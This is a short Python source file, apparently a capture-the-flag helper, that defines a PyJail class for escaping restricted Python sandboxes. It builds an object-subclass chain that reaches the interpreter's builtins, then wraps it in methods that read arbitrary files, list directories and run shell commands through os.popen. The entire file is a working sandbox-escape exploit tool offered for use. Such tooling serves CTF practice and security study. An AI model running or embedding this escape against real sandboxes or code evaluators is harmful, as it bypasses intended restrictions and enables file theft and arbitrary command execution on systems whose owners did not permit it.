class PyJail:
	"""makes interacting with python jails easier"""

	def __init__(self, fn):
		"""fn is the function to interact with the pyjail that takes and returns a string"""
		self.fn = fn
		subclasses = "''.__class__.mro()[1].__subclasses__()"
		self.builtins = f"{subclasses}[-1].__init__.__globals__['__builtins__']"

	def run(self, s: str):
		"""directly run with s appended to self.builtins"""
		return self.fn(self.builtins + s)

	def call(self, fn: str, *args, module: str | None = None):
		"""call function"""
		return self.run(self._call(fn, *args, module))

	def cat(self, filename: str):
		return self.run(self._call("open", filename) + ".read()")

	def ls(self, folder: str = "."):
		return self.call("listdir", folder, module="os")

	def shell(self, cmd: str):
		return self.run(self._call("popen", cmd, module="os") + ".read()")

	def _import(self, module: str):
		return f"['__import__']({module!r})"

	def _call(self, fn: str, *args, module: str | None = None):
		if module is None:  # call builtin
			return f"[{fn!r}](*{args!r})"
		else:  # import module and then call function
			return self._import(module) + f".{fn}(*{args!r})"
